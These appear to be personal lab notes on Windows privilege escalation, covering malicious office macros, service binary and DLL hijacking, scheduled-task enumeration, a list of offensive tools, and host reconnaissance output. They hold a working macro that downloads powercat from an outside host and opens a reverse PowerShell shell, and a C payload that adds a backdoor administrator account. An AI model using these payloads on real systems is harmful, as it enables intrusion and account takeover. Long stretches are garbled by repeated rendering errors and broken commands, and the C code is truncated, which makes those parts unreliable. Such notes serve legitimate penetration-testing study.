---
title: "Windows Privilege Escalation"
weight: 34
---

# Windows Privilege Escalation

&nbsp;

|     |     |
| --- | --- |
| Abusing Windows group privileges | Abusing Windows user privileges |
| Bypassing User Account Control | Abusing weak service/file permissions |
| Leveraging unpatched kernel exploits | Credential theft |
| Traffic Capture | and more. |

&nbsp;

&nbsp;

&nbsp;

MACROS

go to tools-->macros-->oraganise macros--->basic--->click on untitled--->new--->shell commands

![68d9ab25595cff42b5ea1cef140e858a.png](/resources/68d9ab25595cff42b5ea1cef140e858a.png)

&nbsp;

then save it as .odt

```
Sub Main
Shell("cmd /c powershell IEX(New-Object System.Net.WebClient).DownloadString('http://192.168.45.234/powercat.ps1');powercat -c 192.168.45.169 -p 4444 -e powershell")
End Sub
```

&nbsp;

SERvice binary hijacking

![0e770fe0864921221560205b556bb94d.png](/resources/0e770fe0864921221560205b556bb94d.png)

&nbsp;

#include int main () { int i; i = system ("net user dave2 password123! /add"); i = system ("net localgroup administrators dave2 /add"); ret

&nbsp;

&nbsp;

![0b17b7232ab8a91ad81eb2c4f61c24f3.png](/resources/0b17b7232ab8a91ad81eb2c4f61c24f3.png)

&nbsp;

&nbsp;

kali@kali:~$ x86_64-w64-mingw32-gcc adduser.c -o adduser.exe

&nbsp;

&nbsp;

DLL hijacking

Download the binary in ypur pc

&nbsp;run procmon

&nbsp;

![e0576ed85416b42c2edebc73d206ffe3.png](/resources/e0576ed85416b42c2edebc73d206ffe3.png)

&nbsp;

&nbsp;

![dd9e32070810300cc201140df501c150.png](/resources/dd9e32070810300cc201140df501c150.png)

&nbsp;

&nbsp;

![8c4898e6ca365d3fa05c27513412e45e.png](/resources/8c4898e6ca365d3fa05c27513412e45e.png)

&nbsp;

&nbsp;

16.3.1 Scheduled Tasks

&nbsp;

schtasks /query /fo LIST /v | Where-Object {  
    $_ -match "^Task To Run:" -and     $                                                    _ -notmatch "\\\\Windows" -and  
    $_ -notmatch "\\\\System32" -and     $                                                    _ -notmatch "\\\\Program Files" -and  
    $_ -notmatch "\\\\ProgramData" -and     $                                                    _ -notmatch "\\\\Users\\\\Default" -and  
    $_ -notmatch "\\\\Users\\\\Administrator"  
}

schtasks /query /fo LIST /v | Where-Object { $_ -match "^Task To Run:" -and $_ -notmatch "\\\\Windows\\\\System32" -and $_ -notmatch "\\\\Windows" -and $_ -notmatch "\\\\Program Files" -and $_ -notmatch "\\\\ProgramData" -and $_ -notmatch "\\\\Users\\\\Default" -and $_ -notmatch "\\\\Users\\\\Administrator" }

```
schtasks /query /fo LIST /v | Where-Object { $_ -match "^Task To Run:" -and $_ -notmatch "\\Windows\\System32" -and $_ -notmatch "\\Windows" -and $_ -notmatch "\\Program Files" -and $_ -notmatch "\\ProgramData" -and $_ -notmatch "\\Users\\Default" -and $_ -notmatch "\\Users\\Administrator" }

```

&nbsp;

PS C:\\Users\\shaik> schtasks /query /fo LIST /v | Where-Object {$_ -match "^Task To Run:"} | Where-Object {$

KaTeX parse error: Expected 'EOF', got '}' at position 25: …"^Task To Run:"}̲ | Where-Object…

KaTeX parse error: Expected 'EOF', got '}' at position 25: …"^Task To Run:"}̲ | Where-Object…

KaTeX parse error: Expected 'EOF', got '}' at position 25: …"^Task To Run:"}̲ | Where-Object…

KaTeX parse error: Expected 'EOF', got '}' at position 25: …"^Task To Run:"}̲ | Where-Object…

KaTeX parse error: Expected 'EOF', got '}' at position 25: …"^Task To Run:"}̲ | Where-Object…

KaTeX parse error: Expected 'EOF', got '}' at position 25: …"^Task To Run:"}̲ | Where-Object…

KaTeX parse error: Expected 'EOF', got '}' at position 25: …"^Task To Run:"}̲ | Where-Object…

KaTeX parse error: Expected 'EOF', got '}' at position 25: …"^Task To Run:"}̲ | Where-Object…

KaTeX parse error: Expected 'EOF', got '}' at position 25: …"^Task To Run:"}̲ | Where-Object…

KaTeX parse error: Expected 'EOF', got '}' at position 25: …"^Task To Run:"}̲ | Where-Object…

KaTeX parse error: Expected 'EOF', got '}' at position 25: …"^Task To Run:"}̲ | Where-Object…

KaTeX parse error: Expected 'EOF', got '}' at position 25: …"^Task To Run:"}̲ | Where-Object…

_ -notmatch "\\\\Windows"} | Where-Object {$_ -notmatch "\\\\System32"} | Where-Object {$

KaTeX parse error: Expected 'EOF', got '}' at position 27: … "\\\\\\\\System32"}̲ | Where-Object…

KaTeX parse error: Expected 'EOF', got '}' at position 27: … "\\\\\\\\System32"}̲ | Where-Object…

KaTeX parse error: Expected 'EOF', got '}' at position 27: … "\\\\\\\\System32"}̲ | Where-Object…

KaTeX parse error: Expected 'EOF', got '}' at position 27: … "\\\\\\\\System32"}̲ | Where-Object…

KaTeX parse error: Expected 'EOF', got '}' at position 27: … "\\\\\\\\System32"}̲ | Where-Object…

KaTeX parse error: Expected 'EOF', got '}' at position 27: … "\\\\\\\\System32"}̲ | Where-Object…

KaTeX parse error: Expected 'EOF', got '}' at position 27: … "\\\\\\\\System32"}̲ | Where-Object…

KaTeX parse error: Expected 'EOF', got '}' at position 27: … "\\\\\\\\System32"}̲ | Where-Object…

KaTeX parse error: Expected 'EOF', got '}' at position 27: … "\\\\\\\\System32"}̲ | Where-Object…

KaTeX parse error: Expected 'EOF', got '}' at position 27: … "\\\\\\\\System32"}̲ | Where-Object…

KaTeX parse error: Expected 'EOF', got '}' at position 27: … "\\\\\\\\System32"}̲ | Where-Object…

KaTeX parse error: Expected 'EOF', got '}' at position 27: … "\\\\\\\\System32"}̲ | Where-Object…

_ -notmatch "\\\\Program Files"} | Where-Object {$_ -notmatch "\\\\ProgramData"} | Where-Object {$

KaTeX parse error: Expected 'EOF', got '}' at position 30: …\\\\\\ProgramData"}̲ | Where-Object…

KaTeX parse error: Expected 'EOF', got '}' at position 30: …\\\\\\ProgramData"}̲ | Where-Object…

KaTeX parse error: Expected 'EOF', got '}' at position 30: …\\\\\\ProgramData"}̲ | Where-Object…

KaTeX parse error: Expected 'EOF', got '}' at position 30: …\\\\\\ProgramData"}̲ | Where-Object…

KaTeX parse error: Expected 'EOF', got '}' at position 30: …\\\\\\ProgramData"}̲ | Where-Object…

KaTeX parse error: Expected 'EOF', got '}' at position 30: …\\\\\\ProgramData"}̲ | Where-Object…

KaTeX parse error: Expected 'EOF', got '}' at position 30: …\\\\\\ProgramData"}̲ | Where-Object…

KaTeX parse error: Expected 'EOF', got '}' at position 30: …\\\\\\ProgramData"}̲ | Where-Object…

KaTeX parse error: Expected 'EOF', got '}' at position 30: …\\\\\\ProgramData"}̲ | Where-Object…

KaTeX parse error: Expected 'EOF', got '}' at position 30: …\\\\\\ProgramData"}̲ | Where-Object…

KaTeX parse error: Expected 'EOF', got '}' at position 30: …\\\\\\ProgramData"}̲ | Where-Object…

KaTeX parse error: Expected 'EOF', got '}' at position 30: …\\\\\\ProgramData"}̲ | Where-Object…

_ -notmatch "\\\\Users\\\\Default"} | Where-Object {$_ -notmatch "\\\\Users\\\\Administrator"}

&nbsp;

&nbsp;

&nbsp;

&nbsp;

&nbsp;

&nbsp;

&nbsp;

# Useful Tools

* * *

There are many tools available to us to assist with enumerating Windows systems for common and obscure privilege escalation vectors. Below is a list of useful binaries and scripts, many of which we will cover within the coming module sections.

| Tool | Description |
| --- | --- |
| [Seatbelt](https://github.com/GhostPack/Seatbelt) | C# project for performing a wide variety of local privilege escalation checks |
| [winPEAS](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS) | WinPEAS is a script that searches for possible paths to escalate privileges on Windows hosts. All of the checks are explained [here](https://book.hacktricks.wiki/en/windows-hardening/checklist-windows-privilege-escalation.html) |
| [PowerUp](https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Privesc/PowerUp.ps1) | PowerShell script for finding common Windows privilege escalation vectors that rely on misconfigurations. It can also be used to exploit some of the issues found |
| [SharpUp](https://github.com/GhostPack/SharpUp) | C# version of PowerUp |
| [JAWS](https://github.com/411Hall/JAWS) | PowerShell script for enumerating privilege escalation vectors written in PowerShell 2.0 |
| [SessionGopher](https://github.com/Arvanaghi/SessionGopher) | SessionGopher is a PowerShell tool that finds and decrypts saved session information for remote access tools. It extracts PuTTY, WinSCP, SuperPuTTY, FileZilla, and RDP saved session information |
| [Watson](https://github.com/rasta-mouse/Watson) | Watson is a .NET tool designed to enumerate missing KBs and suggest exploits for Privilege Escalation vulnerabilities. |
| [LaZagne](https://github.com/AlessandroZ/LaZagne) | Tool used for retrieving passwords stored on a local machine from web browsers, chat tools, databases, Git, email, memory dumps, PHP, sysadmin tools, wireless network configurations, internal Windows password storage mechanisms, and more |
| [Windows Exploit Suggester - Next Generation](https://github.com/bitsadmin/wesng) | WES-NG is a tool based on the output of Windows' `systeminfo` utility which provides the list of vulnerabilities the OS is vulnerable to, including any exploits for these vulnerabilities. Every Windows OS between Windows XP and Windows 10, including their Windows Server counterparts, is supported |
| [Sysinternals Suite](https://docs.microsoft.com/en-us/sysinternals/downloads/sysinternals-suite) | We will use several tools from Sysinternals in our enumeration including [AccessChk](https://docs.microsoft.com/en-us/sysinternals/downloads/accesschk), [PipeList](https://docs.microsoft.com/en-us/sysinternals/downloads/pipelist), and [PsService](https://docs.microsoft.com/en-us/sysinternals/downloads/psservice) |

&nbsp;

We can also find pre-compiled binaries of `Seatbelt` and `SharpUp` [here](https://github.com/r3motecontrol/Ghostpack-CompiledBinaries), and standalone binaries of `LaZagne` [here](https://github.com/AlessandroZ/LaZagne/releases/). It is recommended that we always compile our tools from the source if using them in a client environment.

&nbsp;

&nbsp;

# Situational Awareness

&nbsp;

#### Interface(s), IP Address(es), DNS Information

Situational Awareness

```cmd-session
C:\local> ipconfig /all

Windows IP Configuration

   Host Name . . . . . . . . . . . . : WINLPE-SRV01
   Primary Dns Suffix  . . . . . . . :
   Node Type . . . . . . . . . . . . : Hybrid
   IP Routing Enabled. . . . . . . . : No
   WINS Proxy Enabled. . . . . . . . : No
   DNS Suffix Search List. . . . . . : .local

Ethernet adapter Ethernet1:

   Connection-specific DNS Suffix  . :
   Description . . . . . . . . . . . : vmxnet3 Ethernet Adapter
   Physical Address. . . . . . . . . : 00-50-56-B9-C5-4B
   DHCP Enabled. . . . . . . . . . . : No
   Autoconfiguration Enabled . . . . : Yes
   Link-local IPv6 Address . . . . . : fe80::f055:fefd:b1b:9919%9(Preferred)
   IPv4 Address. . . . . . . . . . . : 192.168.20.56(Preferred)
   Subnet Mask . . . . . . . . . . . : 255.255.255.0
   Default Gateway . . . . . . . . . : 192.168.20.1
   DHCPv6 IAID . . . . . . . . . . . : 151015510
   DHCPv6 Client DUID. . . . . . . . : 00-01-00-01-27-ED-DB-68-00-50-56-B9-90-94
   DNS Servers . . . . . . . . . . . : 8.8.8.8
   NetBIOS over Tcpip. . . . . . . . : Enabled

Ethernet adapter Ethernet0:

   Connection-specific DNS Suffix  . : .local
   Description . . . . . . . . . . . : Intel(R) 82574L Gigabit Network Connection
   Physical Address. . . . . . . . . : 00-50-56-B9-90-94
   DHCP Enabled. . . . . . . . . . . : Yes
   Autoconfiguration Enabled . . . . : Yes
   IPv6 Address. . . . . . . . . . . : dead:beef::e4db:5ea3:2775:8d4d(Preferred)
   Link-local IPv6 Address . . . . . : fe80::e4db:5ea3:2775:8d4d%4(Preferred)
   IPv4 Address. . . . . . . . . . . : 10.129.43.8(Preferred)
   Subnet Mask . . . . . . . . . . . : 255.255.0.0
   Lease Obtained. . . . . . . . . . : Thursday, March 25, 2021 9:24:45 AM
   Lease Expires . . . . . . . . . . : Monday, March 29, 2021 1:28:44 PM
   Default Gateway . . . . . . . . . : fe80::250:56ff:feb9:4ddf%4
                                       10.129.0.1
   DHCP Server . . . . . . . . . . . : 10.129.0.1
   DHCPv6 IAID . . . . . . . . . . . : 50352214
   DHCPv6 Client DUID. . . . . . . . : 00-01-00-01-27-ED-DB-68-00-50-56-B9-90-94
   DNS Servers . . . . . . . . . . . : 1.1.1.1
                                       8.8.8.8
   NetBIOS over Tcpip. . . . . . . . : Enabled

Tunnel adapter isatap..local:

   Media State . . . . . . . . . . . : Media disconnected
   Connection-specific DNS Suffix  . : .local
   Description . . . . . . . . . . . : Microsoft ISATAP Adapter
   Physical Address. . . . . . . . . : 00-00-00-00-00-00-00-E0
   DHCP Enabled. . . . . . . . . . . : No
   Autoconfiguration Enabled . . . . : Yes

Tunnel adapter Teredo Tunneling Pseudo-Interface:

   Media State . . . . . . . . . . . : Media disconnected
   Connection-specific DNS Suffix  . :
   Description . . . . . . . . . . . : Teredo Tunneling Pseudo-Interface
   Physical Address. . . . . . . . . : 00-00-00-00-00-00-00-E0
   DHCP Enabled. . . . . . . . . . . : No
   Autoconfiguration Enabled . . . . : Yes

Tunnel adapter isatap.{02D6F04C-A625-49D1-A85D-4FB454FBB3DB}:

   Media State . . . . . . . . . . . : Media disconnected
   Connection-specific DNS Suffix  . :
   Description . . . . . . . . . . . : Microsoft ISATAP Adapter #2
   Physical Address. . . . . . . . . : 00-00-00-00-00-00-00-E0
   DHCP Enabled. . . . . . . . . . . : No
   Autoconfiguration Enabled . . . . : Yes
```

#### ARP Table

Situational Awareness

```cmd-session
C:\local> arp -a

Interface: 10.129.43.8 --- 0x4
  Internet Address      Physical Address      Type
  10.129.0.1            00-50-56-b9-4d-df     dynamic
  10.129.43.12          00-50-56-b9-da-ad     dynamic
  10.129.43.13          00-50-56-b9-5b-9f     dynamic
  10.129.255.255        ff-ff-ff-ff-ff-ff     static
  224.0.0.22            01-00-5e-00-00-16     static
  224.0.0.252           01-00-5e-00-00-fc     static
  224.0.0.253           01-00-5e-00-00-fd     static
  239.255.255.250       01-00-5e-7f-ff-fa     static
  255.255.255.255       ff-ff-ff-ff-ff-ff     static

Interface: 192.168.20.56 --- 0x9
  Internet Address      Physical Address      Type
  192.168.20.255        ff-ff-ff-ff-ff-ff     static
  224.0.0.22            01-00-5e-00-00-16     static
  224.0.0.252           01-00-5e-00-00-fc     static
  239.255.255.250       01-00-5e-7f-ff-fa     static
  255.255.255.255       ff-ff-ff-ff-ff-ff     static
```

#### Routing Table

Situational Awareness

```cmd-session
C:\local> route print

===========================================================================
Interface List
  9...00 50 56 b9 c5 4b ......vmxnet3 Ethernet Adapter
  4...00 50 56 b9 90 94 ......Intel(R) 82574L Gigabit Network Connection
  1...........................Software Loopback Interface 1
  3...00 00 00 00 00 00 00 e0 Microsoft ISATAP Adapter
  5...00 00 00 00 00 00 00 e0 Teredo Tunneling Pseudo-Interface
 13...00 00 00 00 00 00 00 e0 Microsoft ISATAP Adapter #2
===========================================================================

IPv4 Route Table
===========================================================================
Active Routes:
Network Destination        Netmask          Gateway       Interface  Metric
          0.0.0.0          0.0.0.0       10.129.0.1      10.129.43.8     25
          0.0.0.0          0.0.0.0     192.168.20.1    192.168.20.56    271
       10.129.0.0      255.255.0.0         On-link       10.129.43.8    281
      10.129.43.8  255.255.255.255         On-link       10.129.43.8    281
   10.129.255.255  255.255.255.255         On-link       10.129.43.8    281
        127.0.0.0        255.0.0.0         On-link         127.0.0.1    331
        127.0.0.1  255.255.255.255         On-link         127.0.0.1    331
  127.255.255.255  255.255.255.255         On-link         127.0.0.1    331
     192.168.20.0    255.255.255.0         On-link     192.168.20.56    271
    192.168.20.56  255.255.255.255         On-link     192.168.20.56    271
   192.168.20.255  255.255.255.255         On-link     192.168.20.56    271
        224.0.0.0        240.0.0.0         On-link         127.0.0.1    331
        224.0.0.0        240.0.0.0         On-link       10.129.43.8    281
        224.0.0.0        240.0.0.0         On-link     192.168.20.56    271
  255.255.255.255  255.255.255.255         On-link         127.0.0.1    331
  255.255.255.255  255.255.255.255         On-link       10.129.43.8    281
  255.255.255.255  255.255.255.255         On-link     192.168.20.56    271
===========================================================================
Persistent Routes:
  Network Address          Netmask  Gateway Address  Metric
          0.0.0.0          0.0.0.0     192.168.20.1  Default
===========================================================================

IPv6 Route Table
===========================================================================
Active Routes:
 If Metric Network Destination      Gateway
  4    281 ::/0                     fe80::250:56ff:feb9:4ddf
  1    331 ::1/128                  On-link
  4    281 dead:beef::/64           On-link
  4    281 dead:beef::e4db:5ea3:2775:8d4d/128
                                    On-link
  4    281 fe80::/64                On-link
  9    271 fe80::/64                On-link
  4    281 fe80::e4db:5ea3:2775:8d4d/128
                                    On-link
  9    271 fe80::f055:fefd:b1b:9919/128
                                    On-link
  1    331 ff00::/8                 On-link
  4    281 ff00::/8                 On-link
  9    271 ff00::/8                 On-link
===========================================================================
Persistent Routes:
  None
```

&nbsp;

&nbsp;

#### Check Windows Defender Status

Situational Awareness

```powershell-session
PS C:\local> Get-MpComputerStatus

AMEngineVersion                 : 1.1.17900.7
AMProductVersion                : 4.10.14393.2248
AMServiceEnabled                : True
AMServiceVersion                : 4.10.14393.2248
AntispywareEnabled              : True
AntispywareSignatureAge         : 1
AntispywareSignatureLastUpdated : 3/28/2021 2:59:13 AM
AntispywareSignatureVersion     : 1.333.1470.0
AntivirusEnabled                : True
AntivirusSignatureAge           : 1
AntivirusSignatureLastUpdated   : 3/28/2021 2:59:12 AM
AntivirusSignatureVersion       : 1.333.1470.0
BehaviorMonitorEnabled          : False
ComputerID                      : 54AF7DE4-3C7E-4DA0-87AC-831B045B9063
ComputerState                   : 0
FullScanAge                     : 4294967295
FullScanEndTime                 :
FullScanStartTime               :
IoavProtectionEnabled           : False
LastFullScanSource              : 0
LastQuickScanSource             : 0
NISEnabled                      : False
NISEngineVersion                : 0.0.0.0
NISSignatureAge                 : 4294967295
NISSignatureLastUpdated         :
NISSignatureVersion             : 0.0.0.0
OnAccessProtectionEnabled       : False
QuickScanAge                    : 4294967295
QuickScanEndTime                :
QuickScanStartTime              :
RealTimeProtectionEnabled       : False
RealTimeScanDirection           : 0
PSComputerName                  :
```

#### List AppLocker Rules

Situational Awareness

```powershell-session
PS C:\local> Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections

PublisherConditions : {*\*\*,0.0.0.0-*}
PublisherExceptions : {}
PathExceptions      : {}
HashExceptions      : {}
Id                  : a9e18c21-ff8f-43cf-b9fc-db40eed693ba
Name                : (Default Rule) All signed packaged apps
Description         : Allows members of the Everyone group to run packaged apps that are signed.
UserOrGroupSid      : S-1-1-0
Action              : Allow

PathConditions      : {%PROGRAMFILES%\*}
PathExceptions      : {}
PublisherExceptions : {}
HashExceptions      : {}
Id                  : 921cc481-6e17-4653-8f75-050b80acca20
Name                : (Default Rule) All files located in the Program Files folder
Description         : Allows members of the Everyone group to run applications that are located in the Program Files
                      folder.
UserOrGroupSid      : S-1-1-0
Action              : Allow

PathConditions      : {%WINDIR%\*}
PathExceptions      : {}
PublisherExceptions : {}
HashExceptions      : {}
Id                  : a61c8b2c-a319-4cd0-9690-d2177cad7b51
Name                : (Default Rule) All files located in the Windows folder
Description         : Allows members of the Everyone group to run applications that are located in the Windows folder.
UserOrGroupSid      : S-1-1-0
Action              : Allow

PathConditions      : {*}
PathExceptions      : {}
PublisherExceptions : {}
HashExceptions      : {}
Id                  : fd686d83-a829-4351-8ff4-27c7de5755d2
Name                : (Default Rule) All files
Description         : Allows members of the local Administrators group to run all applications.
UserOrGroupSid      : S-1-5-32-544
Action              : Allow

PublisherConditions : {*\*\*,0.0.0.0-*}
PublisherExceptions : {}
PathExceptions      : {}
HashExceptions      : {}
Id                  : b7af7102-efde-4369-8a89-7a6a392d1473
Name                : (Default Rule) All digitally signed Windows Installer files
Description         : Allows members of the Everyone group to run digitally signed Windows Installer files.
UserOrGroupSid      : S-1-1-0
Action              : Allow

PathConditions      : {%WINDIR%\Installer\*}
PathExceptions      : {}
PublisherExceptions : {}
HashExceptions      : {}
Id                  : 5b290184-345a-4453-b184-45305f6d9a54
Name                : (Default Rule) All Windows Installer files in %systemdrive%\Windows\Installer
Description         : Allows members of the Everyone group to run all Windows Installer files located in
                      %systemdrive%\Windows\Installer.
UserOrGroupSid      : S-1-1-0
Action              : Allow

PathConditions      : {*.*}
PathExceptions      : {}
PublisherExceptions : {}
HashExceptions      : {}
Id                  : 64ad46ff-0d71-4fa0-a30b-3f3d30c5433d
Name                : (Default Rule) All Windows Installer files
Description         : Allows members of the local Administrators group to run all Windows Installer files.
UserOrGroupSid      : S-1-5-32-544
Action              : Allow

PathConditions      : {%PROGRAMFILES%\*}
PathExceptions      : {}
PublisherExceptions : {}
HashExceptions      : {}
Id                  : 06dce67b-934c-454f-a263-2515c8796a5d
Name                : (Default Rule) All scripts located in the Program Files folder
Description         : Allows members of the Everyone group to run scripts that are located in the Program Files folder.
UserOrGroupSid      : S-1-1-0
Action              : Allow

PathConditions      : {%WINDIR%\*}
PathExceptions      : {}
PublisherExceptions : {}
HashExceptions      : {}
Id                  : 9428c672-5fc3-47f4-808a-a0011f36dd2c
Name                : (Default Rule) All scripts located in the Windows folder
Description         : Allows members of the Everyone group to run scripts that are located in the Windows folder.
UserOrGroupSid      : S-1-1-0
Action              : Allow

PathConditions      : {*}
PathExceptions      : {}
PublisherExceptions : {}
HashExceptions      : {}
Id                  : ed97d0cb-15ff-430f-b82c-8d7832957725
Name                : (Default Rule) All scripts
Description         : Allows members of the local Administrators group to run all scripts.
UserOrGroupSid      : S-1-5-32-544
Action              : Allow
```

#### Test AppLocker Policy

Situational Awareness

```powershell-session
PS C:\local> Get-AppLockerPolicy -Local | Test-AppLockerPolicy -path C:\Windows\System32\cmd.exe -User Everyone

FilePath                    PolicyDecision MatchingRule
--------                    -------------- ------------
C:\Windows\System32\cmd.exe         Denied c:\windows\system32\cmd.exe
```

&nbsp;

&nbsp;

&nbsp;

# Initial Enumeration

&nbsp;

&nbsp;

#### Tasklist

Initial Enumeration

```cmd-session
C:\local> tasklist /svc

Image Name                     PID Services
========================= ======== ============================================
System Idle Process              0 N/A
System                           4 N/A
smss.exe                       316 N/A
csrss.exe                      424 N/A
wininit.exe                    528 N/A
csrss.exe                      540 N/A
winlogon.exe                   612 N/A
services.exe                   664 N/A
lsass.exe                      672 KeyIso, SamSs, VaultSvc
svchost.exe                    776 BrokerInfrastructure, DcomLaunch, LSM,
                                   PlugPlay, Power, SystemEventsBroker
svchost.exe                    836 RpcEptMapper, RpcSs
LogonUI.exe                    952 N/A
dwm.exe                        964 N/A
svchost.exe                    972 TermService
svchost.exe                   1008 Dhcp, EventLog, lmhosts, TimeBrokerSvc
svchost.exe                    364 NcbService, PcaSvc, ScDeviceEnum, TrkWks,
                                   UALSVC, UmRdpService
<...SNIP...>

svchost.exe                   1468 Wcmsvc
svchost.exe                   1804 PolicyAgent
spoolsv.exe                   1884 Spooler
svchost.exe                   1988 W3SVC, WAS
svchost.exe                   1996 ftpsvc
svchost.exe                   2004 AppHostSvc
FileZilla Server.exe          1140 FileZilla Server
inetinfo.exe                  1164 IISADMIN
svchost.exe                   1736 DiagTrack
svchost.exe                   2084 StateRepository, tiledatamodelsvc
VGAuthService.exe             2100 VGAuthService
vmtoolsd.exe                  2112 VMTools
MsMpEng.exe                   2136 WinDefend

<...SNIP...>

FileZilla Server Interfac     5628 N/A
jusched.exe                   5796 N/A
cmd.exe                       4132 N/A
conhost.exe                   4136 N/A
TrustedInstaller.exe          1120 TrustedInstaller
TiWorker.exe                  1816 N/A
WmiApSrv.exe                  2428 wmiApSrv
tasklist.exe                  3596 N/A
```

&nbsp;

&nbsp;

It is essential to become familiar with standard Windows processes such as [Session Manager Subsystem (smss.exe)](https://en.wikipedia.org/wiki/Session_Manager_Subsystem), [Client Server Runtime Subsystem (csrss.exe)](https://en.wikipedia.org/wiki/Client/Server_Runtime_Subsystem), [WinLogon (winlogon.exe)](https://en.wikipedia.org/wiki/Winlogon), [Local Security Authority Subsystem Service (LSASS)](https://en.wikipedia.org/wiki/Local_Security_Authority_Subsystem_Service), and [Service Host (svchost.exe)](https://en.wikipedia.org/wiki/Svchost.exe), among others and the services associated with them. Being able to spot standard processes/services quickly will help speed up our enumeration and enable us to hone in on non-standard processes/services, which may open up a privilege escalation path. In the example above, we would be most interested in the `FileZilla` FTP server running and would attempt to enumerate the version to look for public vulnerabilities or misconfigurations such as FTP anonymous access, which could lead to sensitive data exposure or more.

Other processes such as `MsMpEng.exe`, Windows Defender, are interesting because they can help us map out what protections are in place on the target host that we may have to evade/bypass.

&nbsp;

&nbsp;

&nbsp;

#### Display All Environment Variables

&nbsp;

#### Display All Environment Variables

The environment variables explain a lot about the host configuration. To get a printout of them, Windows provides the `set` command. One of the most overlooked variables is `PATH`. In the output below, nothing is out of the ordinary. However, it is not uncommon to find administrators (or applications) modify the `PATH`. One common example is to place Python or Java in the path, which would allow the execution of Python or . JAR files. If the folder placed in the PATH is writable by your user, it may be possible to perform DLL Injections against other applications. Remember, when running a program, Windows looks for that program in the CWD (Current Working Directory) first, then from the PATH going left to right. This means if the custom path is placed on the left (before C:\\Windows\\System32), it is much more dangerous than on the right.

In addition to the PATH, `set` can also give up other helpful information such as the HOME DRIVE. In enterprises, this will often be a file share. Navigating to the file share itself may reveal other directories that can be accessed. It is not unheard of to be able to access an "IT Directory," which contains an inventory spreadsheet that includes passwords. Additionally, shares are utilized for home directories so the user can log on to other computers and have the same experience/files/desktop/etc. ([Roaming Profiles](https://docs.microsoft.com/en-us/windows-server/storage/folder-redirection/folder-redirection-rup-overview)). This may also mean the user takes malicious items with them. If a file is placed in `USERPROFILE\AppData\Microsoft\Windows\Start Menu\Programs\Startup`, when the user logs into a different machine, this file will execute.

Initial Enumeration

```cmd-session
C:\local> set

ALLUSERSPROFILE=C:\ProgramData
APPDATA=C:\Users\Administrator\AppData\Roaming
CommonProgramFiles=C:\Program Files\Common Files
CommonProgramFiles(x86)=C:\Program Files (x86)\Common Files
CommonProgramW6432=C:\Program Files\Common Files
COMPUTERNAME=WINLPE-SRV01
ComSpec=C:\Windows\system32\cmd.exe
HOMEDRIVE=C:
HOMEPATH=\Users\Administrator
LOCALAPPDATA=C:\Users\Administrator\AppData\Local
LOGONSERVER=\\WINLPE-SRV01
NUMBER_OF_PROCESSORS=6
OS=Windows_NT
Path=C:\Windows\system32;C:\Windows;C:\Windows\System32\Wbem;C:\Windows\System32\WindowsPowerShell\v1.0\;C:\Users\Administrator\AppData\Local\Microsoft\WindowsApps;
PATHEXT=.COM;.EXE;.BAT;.CMD;.VBS;.VBE;.JS;.JSE;.WSF;.WSH;.MSC
PROCESSOR_ARCHITECTURE=AMD64
PROCESSOR_IDENTIFIER=AMD64 Family 23 Model 49 Stepping 0, AuthenticAMD
PROCESSOR_LEVEL=23
PROCESSOR_REVISION=3100
ProgramData=C:\ProgramData
ProgramFiles=C:\Program Files
ProgramFiles(x86)=C:\Program Files (x86)
ProgramW6432=C:\Program Files
PROMPT=$P$G
PSModulePath=C:\Program Files\WindowsPowerShell\Modules;C:\Windows\system32\WindowsPowerShell\v1.0\Modules
PUBLIC=C:\Users\Public
SESSIONNAME=Console
SystemDrive=C:
SystemRoot=C:\Windows
TEMP=C:\Users\ADMINI~1\AppData\Local\Temp\1
TMP=C:\Users\ADMINI~1\AppData\Local\Temp\1
USERDOMAIN=WINLPE-SRV01
USERDOMAIN_ROAMINGPROFILE=WINLPE-SRV01
USERNAME=Administrator
USERPROFILE=C:\Users\Administrator
```

&nbsp;

&nbsp;SYSTEMINFO

[HotFixes](https://www.catalog.update.microsoft.com/Search.aspx?q=hotfix) to get an idea of when the box has been patched. This information isn't always present, as it is possible to hide hotfixes software from non-administrators. The `System Boot Time` and `OS Version` can also be checked to get an idea of the patch level. If the box has not been restarted in over six months, chances are it is also not being patched.

Additionally, many guides will say the Network Information is important as it could indicate a dual-homed machine (connected to multiple networks). Generally speaking, when it comes to enterprises, devices will just be granted access to other networks via a firewall rule and not have a physical cable run to them.

Initial Enumeration

```cmd-session
C:\local> systeminfo

Host Name:                 WINLPE-SRV01
OS Name:                   Microsoft Windows Server 2016 Standard
OS Version:                10.0.14393 N/A Build 14393
OS Manufacturer:           Microsoft Corporation
OS Configuration:          Standalone Server
OS Build Type:             Multiprocessor Free
Registered Owner:          Windows User
Registered Organization:
Product ID:                00376-30000-00299-AA303
Original Install Date:     3/24/2021, 3:46:32 PM
System Boot Time:          3/25/2021, 9:24:36 AM
System Manufacturer:       VMware, Inc.
System Model:              VMware7,1
System Type:               x64-based PC
Processor(s):              3 Processor(s) Installed.
                           [01]: AMD64 Family 23 Model 49 Stepping 0 AuthenticAMD ~2994 Mhz
                           [02]: AMD64 Family 23 Model 49 Stepping 0 AuthenticAMD ~2994 Mhz
                           [03]: AMD64 Family 23 Model 49 Stepping 0 AuthenticAMD ~2994 Mhz
BIOS Version:              VMware, Inc. VMW71.00V.16707776.B64.2008070230, 8/7/2020
Windows Directory:         C:\Windows
System Directory:          C:\Windows\system32
Boot Device:               \Device\HarddiskVolume2
System Locale:             en-us;English (United States)
Input Locale:              en-us;English (United States)
Time Zone:                 (UTC-08:00) Pacific Time (US & Canada)
Total Physical Memory:     6,143 MB
Available Physical Memory: 3,474 MB
Virtual Memory: Max Size:  10,371 MB
Virtual Memory: Available: 7,544 MB
Virtual Memory: In Use:    2,827 MB
Page File Location(s):     C:\pagefile.sys
Domain:                    WORKGROUP
Logon Server:              \\WINLPE-SRV01
Hotfix(s):                 3 Hotfix(s) Installed.
                           [01]: KB3199986
                           [02]: KB5001078
                           [03]: KB4103723
Network Card(s):           2 NIC(s) Installed.
                           [01]: Intel(R) 82574L Gigabit Network Connection
                                 Connection Name: Ethernet0
                                 DHCP Enabled:    Yes
                                 DHCP Server:     10.129.0.1
                                 IP address(es)
                                 [01]: 10.129.43.8
                                 [02]: fe80::e4db:5ea3:2775:8d4d
                                 [03]: dead:beef::e4db:5ea3:2775:8d4d
                           [02]: vmxnet3 Ethernet Adapter
                                 Connection Name: Ethernet1
                                 DHCP Enabled:    No
                                 IP address(es)
                                 [01]: 192.168.20.56
